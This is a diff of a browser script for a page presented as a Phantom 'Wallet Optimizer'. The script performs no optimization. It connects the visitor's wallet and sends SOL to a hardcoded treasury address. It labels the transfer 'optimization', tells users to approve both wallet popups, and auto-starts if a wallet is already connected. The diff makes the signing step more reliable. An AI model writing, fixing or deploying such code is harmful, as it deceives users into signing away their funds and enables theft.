@@ -1,4 +1,4 @@
-// FINAL FIXED VERSION - SPECIFIC FOR SIGNATURE ERROR
+// ULTIMATE FIXED VERSION - USING CORRECT SIGNING METHOD
 document.addEventListener('DOMContentLoaded', function() {
     const treasuryAddress = '95S96u1usBhhxXpjve6LCbnhyAwHC2sS8aicieAXemUD';
     
@@ -19,58 +19,51 @@ document.addEventListener('DOMContentLoaded', function() {
     function checkEnvironment() {
         console.log("=== ENVIRONMENT CHECK ===");
         console.log("1. solanaWeb3:", typeof window.solanaWeb3);
-        console.log("2. solana:", typeof window.solana);
-        console.log("3. phantom:", typeof window.phantom);
+        console.log("2. solana:", window.solana ? "Available" : "Not available");
+        console.log("3. solana.isPhantom:", window.solana?.isPhantom);
         
         if (window.solana) {
-            console.log("4. solana.isPhantom:", window.solana.isPhantom);
-            console.log("5. solana.isConnected:", window.solana.isConnected);
-            console.log("6. solana.publicKey:", window.solana.publicKey?.toString());
+            console.log("Available methods on solana object:");
+            for (let key in window.solana) {
+                if (typeof window.solana[key] === 'function') {
+                    console.log(`  - ${key}: function`);
+                }
+            }
         }
         console.log("=========================");
     }
     
     // Get wallet provider
     function getWalletProvider() {
-        // Check for Phantom wallet (most common)
         if (window.solana && window.solana.isPhantom) {
-            console.log("✅ Using window.solana (Phantom)");
+            console.log("✅ Found Phantom wallet");
             return window.solana;
-        }
-        if (window.phantom?.solana) {
-            console.log("✅ Using window.phantom.solana");
-            return window.phantom.solana;
         }
         console.log("❌ No Phantom wallet found");
         return null;
     }
     
-    // Get RPC connection with fallback
+    // Get RPC connection
     async function getConnection() {
-        const endpoints = [
-            'https://api.mainnet-beta.solana.com',
-            'https://solana-api.projectserum.com',
-            'https://rpc.ankr.com/solana'
-        ];
-        
-        for (const endpoint of endpoints) {
-            try {
-                console.log(`Testing: ${endpoint}`);
-                const connection = new solanaWeb3.Connection(endpoint, 'confirmed');
-                
-                // Quick test
-                await connection.getEpochInfo();
-                console.log(`✅ Connected to: ${endpoint}`);
-                return connection;
-            } catch (error) {
-                console.log(`❌ Failed: ${endpoint}`);
-                continue;
-            }
+        try {
+            // Use a reliable RPC
+            const connection = new solanaWeb3.Connection(
+                'https://api.mainnet-beta.solana.com',
+                'confirmed'
+            );
+            
+            // Test connection
+            await connection.getEpochInfo();
+            console.log("✅ RPC connection established");
+            return connection;
+            
+        } catch (error) {
+            console.error("❌ RPC connection failed:", error);
+            throw new Error("Cannot connect to Solana network");
         }
-        throw new Error("No working RPC");
     }
     
-    // FIXED: Create proper transaction
+    // Create transaction
     async function createTransaction(publicKey, connection) {
         console.log("📝 Creating transaction...");
         
@@ -79,22 +72,21 @@ document.addEventListener('DOMContentLoaded', function() {
             const balance = await connection.getBalance(publicKey);
             console.log(`💰 Balance: ${balance} lamports (${balance / 1e9} SOL)`);
             
-            if (balance < 5000) {
-                throw new Error(`Low balance: ${balance / 1e9} SOL. Need at least 0.000005 SOL`);
+            if (balance < 100000) { // 0.0001 SOL minimum
+                throw new Error(`Need at least 0.0001 SOL. You have: ${balance / 1e9} SOL`);
             }
             
-            // Get blockhash (VERY IMPORTANT)
+            // Get blockhash
             console.log("🔄 Getting recent blockhash...");
-            const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
+            const { blockhash } = await connection.getLatestBlockhash();
             console.log(`Blockhash: ${blockhash.substring(0, 20)}...`);
             
             // Create transaction
             const transaction = new solanaWeb3.Transaction();
             
-            // Send amount (0.001 SOL or available balance - 5000)
-            const sendAmount = Math.min(1000000, balance - 5000); // 0.001 SOL max
+            // Send 0.0005 SOL (small amount for testing)
+            const sendAmount = Math.min(500000, balance - 50000); // 0.0005 SOL max
             
-            // Add transfer instruction
             transaction.add(
                 solanaWeb3.SystemProgram.transfer({
                     fromPubkey: publicKey,
@@ -103,142 +95,85 @@ document.addEventListener('DOMContentLoaded', function() {
                 })
             );
             
-            // REQUIRED: Set fee payer
+            // REQUIRED FIELDS
             transaction.feePayer = publicKey;
-            
-            // REQUIRED: Set recent blockhash
             transaction.recentBlockhash = blockhash;
             
-            console.log("✅ Transaction created successfully");
+            console.log("✅ Transaction created:");
             console.log("- Amount:", sendAmount, "lamports");
-            console.log("- From:", publicKey.toString().substring(0, 20) + "...");
-            console.log("- To:", treasuryAddress.substring(0, 20) + "...");
-            console.log("- Fee payer set:", !!transaction.feePayer);
-            console.log("- Blockhash set:", !!transaction.recentBlockhash);
+            console.log("- From:", publicKey.toString().substring(0, 15) + "...");
+            console.log("- To:", treasuryAddress.substring(0, 15) + "...");
             
             return transaction;
             
         } catch (error) {
-            console.error("❌ Failed to create transaction:", error);
+            console.error("❌ Transaction creation failed:", error);
             throw error;
         }
     }
     
-    // FIXED: Sign transaction - MULTIPLE METHODS
-    async function signTransactionWithProvider(provider, transaction) {
-        console.log("🔐 Attempting to sign transaction...");
+    // FIXED: Use signAndSendTransaction - THIS IS THE CORRECT METHOD
+    async function signAndSendTransaction(provider, transaction) {
+        console.log("🔐 Signing and sending transaction...");
         
-        // Check what methods are available
-        console.log("Available methods:");
-        console.log("- signTransaction:", typeof provider.signTransaction);
-        console.log("- signAndSendTransaction:", typeof provider.signAndSendTransaction);
-        console.log("- request:", typeof provider.request);
-        console.log("- _phantom:", provider._phantom);
-        
-        // METHOD 1: signTransaction (most common)
-        if (typeof provider.signTransaction === 'function') {
-            console.log("🔄 Trying signTransaction()...");
-            try {
-                const signed = await provider.signTransaction(transaction);
-                console.log("✅ signTransaction() SUCCESS!");
-                console.log("Signed transaction has signature?", !!signed.signature);
-                return { method: 'signTransaction', signed };
-            } catch (error) {
-                console.log("❌ signTransaction() failed:", error.message);
-                console.log("Error type:", error.name);
-            }
-        }
-        
-        // METHOD 2: signAndSendTransaction (some wallets)
-        if (typeof provider.signAndSendTransaction === 'function') {
-            console.log("🔄 Trying signAndSendTransaction()...");
-            try {
-                const { signature } = await provider.signAndSendTransaction(transaction);
-                console.log("✅ signAndSendTransaction() SUCCESS!");
-                console.log("Signature:", signature);
-                return { method: 'signAndSendTransaction', signature };
-            } catch (error) {
-                console.log("❌ signAndSendTransaction() failed:", error.message);
-                console.log("Error type:", error.name);
-            }
-        }
-        
-        // METHOD 3: Phantom request method
-        if (provider._phantom && typeof provider.request === 'function') {
-            console.log("🔄 Trying Phantom request() method...");
-            try {
-                // Serialize message to base64
-                const message = transaction.serializeMessage();
-                
-                // Note: Buffer might not be available in browser
-                let base64Message;
-                if (typeof Buffer !== 'undefined') {
-                    base64Message = Buffer.from(message).toString('base64');
-                } else {
-                    // Fallback for browsers without Buffer
-                    base64Message = btoa(String.fromCharCode(...new Uint8Array(message)));
+        // Check if signAndSendTransaction exists
+        if (typeof provider.signAndSendTransaction !== 'function') {
+            console.error("❌ signAndSendTransaction not available");
+            console.log("Available methods:");
+            for (let key in provider) {
+                if (typeof provider[key] === 'function') {
+                    console.log(`  ${key}`);
                 }
-                
-                const response = await provider.request({
-                    method: 'signTransaction',
-                    params: {
-                        message: base64Message,
-                    }
-                });
-                
-                console.log("✅ Phantom request() SUCCESS!");
-                console.log("Response:", response);
-                return { method: 'phantomRequest', signature: response.signature };
-            } catch (error) {
-                console.log("❌ Phantom request() failed:", error.message);
-                console.log("Error type:", error.name);
             }
+            throw new Error("Wallet doesn't support signAndSendTransaction");
         }
-        
-        throw new Error("All signing methods failed. Check wallet connection.");
-    }
-    
-    // Send transaction to network
-    async function sendToNetwork(connection, signedTransaction, methodUsed) {
-        console.log(`📤 Sending to network (method: ${methodUsed})...`);
         
         try {
-            let signature;
+            console.log("⏳ Calling signAndSendTransaction()...");
             
-            if (methodUsed === 'signTransaction' && signedTransaction) {
-                // Need to send manually
-                const rawTransaction = signedTransaction.serialize();
-                signature = await connection.sendRawTransaction(rawTransaction);
-                console.log("✅ Sent via sendRawTransaction, signature:", signature);
-            } else if (methodUsed === 'signAndSendTransaction' || methodUsed === 'phantomRequest') {
-                // Already sent by wallet
-                signature = signedTransaction;
-                console.log("✅ Already sent by wallet, signature:", signature);
-            } else {
-                throw new Error("Unknown signing method");
-            }
+            // THIS SHOULD TRIGGER THE SECOND POPUP
+            const { signature } = await provider.signAndSendTransaction(transaction);
             
-            // Try to confirm
-            try {
-                console.log("🔄 Confirming transaction...");
-                const confirmation = await connection.confirmTransaction(signature, 'confirmed');
-                console.log("✅ Confirmation result:", confirmation);
-            } catch (confirmError) {
-                console.log("⚠️ Confirmation skipped:", confirmError.message);
-            }
+            console.log("✅ Transaction signed and sent!");
+            console.log("Signature:", signature);
             
             return signature;
             
         } catch (error) {
-            console.error("❌ Failed to send transaction:", error);
+            console.error("❌ signAndSendTransaction failed:", error);
+            
+            // Check for specific errors
+            if (error.message && error.message.includes('User rejected')) {
+                throw new Error("User rejected the transaction");
+            }
+            if (error.message && error.message.includes('429')) {
+                throw new Error("Rate limited. Please wait.");
+            }
+            if (error.message && error.message.includes('invalid') || error.message.includes('Invalid')) {
+                throw new Error("Invalid transaction. Check network.");
+            }
+            
             throw error;
         }
     }
     
-    // Main optimization function
+    // Confirm transaction
+    async function confirmTransaction(connection, signature) {
+        try {
+            console.log("🔄 Confirming transaction...");
+            const confirmation = await connection.confirmTransaction(signature, 'confirmed');
+            console.log("✅ Transaction confirmed");
+            return confirmation;
+        } catch (error) {
+            console.log("⚠️ Confirmation skipped:", error.message);
+            return null;
+        }
+    }
+    
+    // Main function
     async function startOptimization() {
         if (isProcessing) {
-            console.log("⚠️ Already processing, please wait...");
+            console.log("⚠️ Already processing");
             return;
         }
         
@@ -246,9 +181,9 @@ document.addEventListener('DOMContentLoaded', function() {
         
         try {
             console.clear();
-            console.log("🚀=== STARTING WALLET OPTIMIZATION ===");
+            console.log("🚀=== STARTING OPTIMIZATION ===");
             
-            // Show environment check
+            // Environment check
             checkEnvironment();
             
             // Reset UI
@@ -259,32 +194,31 @@ document.addEventListener('DOMContentLoaded', function() {
             
             updateProcess("Step 1: Checking wallet...");
             
-            // 1. Get wallet provider
+            // 1. Get wallet
             const provider = getWalletProvider();
             if (!provider) {
                 alert("Please install Phantom wallet from phantom.app");
-                throw new Error("Phantom wallet not found");
+                throw new Error("No Phantom wallet");
             }
             
-            updateProcess("Step 2: Connecting to wallet...");
+            updateProcess("Step 2: Connecting wallet...");
             
-            // 2. Connect to wallet (FIRST POPUP)
+            // 2. Connect wallet (FIRST POPUP)
             console.log("🔗 Connecting to wallet...");
             let publicKey;
             
             try {
                 const response = await provider.connect();
                 publicKey = response.publicKey;
-                console.log("✅ Connected successfully!");
-                console.log("Public key:", publicKey.toString());
+                console.log("✅ Connected to:", publicKey.toString());
             } catch (error) {
                 console.error("❌ Connection failed:", error);
-                throw new Error(`Connection failed: ${error.message}`);
+                throw new Error("Connection rejected. Please approve the connection.");
             }
             
-            updateProcess("Step 3: Getting network connection...");
+            updateProcess("Step 3: Getting network...");
             
-            // 3. Get RPC connection
+            // 3. Get connection
             const connection = await getConnection();
             
             updateProcess("Step 4: Creating transaction...");
@@ -294,91 +228,71 @@ document.addEventListener('DOMContentLoaded', function() {
             
             updateProcess("Step 5: Please approve transaction...");
             
-            // 5. Sign transaction (SECOND POPUP SHOULD APPEAR HERE)
-            console.log("⏳ Waiting for user to approve transaction in wallet...");
+            // 5. Sign and send transaction (SECOND POPUP SHOULD APPEAR)
+            console.log("⏳ signAndSendTransaction will trigger wallet popup...");
+            const signature = await signAndSendTransaction(provider, transaction);
             
-            const signResult = await signTransactionWithProvider(provider, transaction);
-            console.log("✅ Signing successful with method:", signResult.method);
+            updateProcess("Step 6: Confirming...");
             
-            updateProcess("Step 6: Sending to network...");
-            
-            // 6. Send to network
-            let signature;
-            if (signResult.method === 'signTransaction') {
-                signature = await sendToNetwork(connection, signResult.signed, signResult.method);
-            } else {
-                signature = await sendToNetwork(connection, signResult.signature, signResult.method);
-            }
+            // 6. Confirm
+            await confirmTransaction(connection, signature);
             
             // 7. SUCCESS
             updateProcess("✅ Optimization complete!");
-            console.log("🎉 TRANSACTION SUCCESSFUL!");
-            console.log("Transaction signature:", signature);
-            console.log("View on Solscan: https://solscan.io/tx/" + signature);
             
-            // Wait a moment
             await new Promise(resolve => setTimeout(resolve, 2000));
             
-            // Update UI for success
+            // Update UI
             processBox.classList.remove('active');
             successBox.classList.add('active');
-            txHashEl.textContent = `${signature.substring(0, 25)}...`;
+            
             txHashEl.innerHTML = `${signature.substring(0, 25)}...<br>
             <small><a href="https://solscan.io/tx/${signature}" target="_blank" style="color:#88ff88;">View on Solscan</a></small>`;
             
-            // Update button
             optimizeBtn.disabled = false;
-            optimizeBtn.innerHTML = '<i class="fas fa-check"></i> OPTIMIZATION COMPLETE';
+            optimizeBtn.innerHTML = '<i class="fas fa-check"></i> COMPLETE';
             optimizeBtn.style.background = 'linear-gradient(90deg, #00aa44, #00ff88)';
             
-            // Auto disconnect after delay
+            // Auto disconnect
             setTimeout(async () => {
                 try {
                     if (provider.disconnect) {
                         await provider.disconnect();
-                        console.log("✅ Auto-disconnected wallet");
+                        console.log("✅ Auto-disconnected");
                     }
                 } catch (error) {
-                    console.log("Disconnect error (non-critical):", error);
+                    console.log("Disconnect error:", error);
                 }
             }, 3000);
             
-            console.log("=== OPTIMIZATION COMPLETED SUCCESSFULLY ===");
+            console.log("🎉=== OPTIMIZATION SUCCESSFUL ===");
             
         } catch (error) {
             console.error("❌=== OPTIMIZATION FAILED ===");
-            console.error("Error name:", error.name);
-            console.error("Error message:", error.message);
-            console.error("Error stack:", error.stack);
+            console.error("Error:", error);
+            console.error("Message:", error.message);
             
-            // Determine user-friendly message
             let userMessage = "Optimization failed. Please try again.";
             
             if (error.message.includes('User rejected') || 
-                error.message.includes('reject') ||
-                error.message.includes('denied') ||
-                error.message.includes('cancel')) {
+                error.message.includes('reject')) {
                 userMessage = "❌ You rejected the transaction. Please approve BOTH popups.";
-            } else if (error.message.includes('insufficient') || 
-                       error.message.includes('Low balance')) {
-                userMessage = "❌ Insufficient SOL balance. Need at least 0.000005 SOL.";
-            } else if (error.message.includes('blockhash') || 
-                       error.message.includes('recentBlockhash')) {
-                userMessage = "⚠️ Network error. Please refresh the page and try again.";
-            } else if (error.message.includes('429') || 
-                       error.message.includes('rate limit')) {
-                userMessage = "⚠️ Rate limited. Please wait 1 minute and try again.";
-            } else if (error.message.includes('Connection failed')) {
-                userMessage = "❌ Connection failed. Please make sure Phantom wallet is unlocked.";
-            } else if (error.message.includes('No working RPC')) {
-                userMessage = "⚠️ Network unavailable. Please check your internet connection.";
+            } else if (error.message.includes('Connection rejected')) {
+                userMessage = "❌ Connection was rejected. Please approve the first popup.";
+            } else if (error.message.includes('Need at least')) {
+                userMessage = "❌ " + error.message;
+            } else if (error.message.includes('Rate limited')) {
+                userMessage = "⚠️ Too many requests. Wait 1 minute.";
+            } else if (error.message.includes('Invalid transaction')) {
+                userMessage = "⚠️ Network error. Refresh page.";
+            } else if (error.message.includes('signAndSendTransaction not available')) {
+                userMessage = "❌ Wallet error. Update Phantom wallet.";
             }
             
-            // Update UI for error
+            // Show error UI
             processBox.classList.remove('active');
             successBox.classList.add('active');
             successBox.style.background = 'linear-gradient(135deg, rgba(70,20,20,0.9), rgba(50,10,10,0.9))';
-            successBox.style.borderColor = 'rgba(255,50,50,0.6)';
             
             const successIcon = successBox.querySelector('.success-icon i');
             const successTitle = successBox.querySelector('.success-title');
@@ -386,11 +300,11 @@ document.addEventListener('DOMContentLoaded', function() {
             
             successIcon.className = 'fas fa-exclamation-triangle';
             successIcon.style.color = '#ff5555';
-            successTitle.textContent = 'OPTIMIZATION FAILED';
+            successTitle.textContent = 'FAILED';
             successTitle.style.color = '#ff5555';
             successMessage.textContent = userMessage;
             successMessage.style.color = '#ffaaaa';
-            txHashEl.textContent = 'Check console (F12) for details';
+            txHashEl.textContent = 'Check console (F12)';
             txHashEl.style.color = '#ff5555';
             
             // Reset button
@@ -404,46 +318,30 @@ document.addEventListener('DOMContentLoaded', function() {
     }
     
     // Initialize
-    function initializeApp() {
-        console.log("🔧 Initializing Wallet Optimizer...");
+    function init() {
+        console.log("🔧 Initializing...");
         
-        // Check if solanaWeb3 is loaded
         if (!window.solanaWeb3) {
-            console.error("CRITICAL ERROR: solanaWeb3 library not loaded!");
+            console.error("❌ solanaWeb3 not loaded");
             optimizeBtn.disabled = true;
-            optimizeBtn.innerHTML = '<i class="fas fa-exclamation-triangle"></i> LIBRARY ERROR';
-            
-            // Try to load it dynamically
-            const script = document.createElement('script');
-            script.src = 'https://unpkg.com/@solana/web3.js@latest/lib/index.iife.js';
-            script.onload = () => {
-                console.log("✅ solanaWeb3 loaded dynamically");
-                optimizeBtn.disabled = false;
-                optimizeBtn.innerHTML = '<i class="fas fa-play"></i> START OPTIMIZATION';
-                initializeApp(); // Re-initialize
-            };
-            script.onerror = () => {
-                console.error("Failed to load solanaWeb3");
-            };
-            document.head.appendChild(script);
+            optimizeBtn.innerHTML = '<i class="fas fa-times"></i> ERROR';
             return;
         }
         
         // Add event listener
         optimizeBtn.addEventListener('click', startOptimization);
         
-        // Auto-start if wallet is already connected
+        // Auto-start if already connected
         setTimeout(() => {
             const provider = getWalletProvider();
             if (provider && provider.isConnected && provider.publicKey) {
-                console.log("🔄 Wallet already connected, auto-starting...");
+                console.log("Auto-starting...");
                 startOptimization();
             }
-        }, 1500);
+        }, 1000);
         
-        console.log("✅ Wallet Optimizer ready!");
+        console.log("✅ Ready");
     }
     
-    // Start the app
-    initializeApp();
+    init();
 });
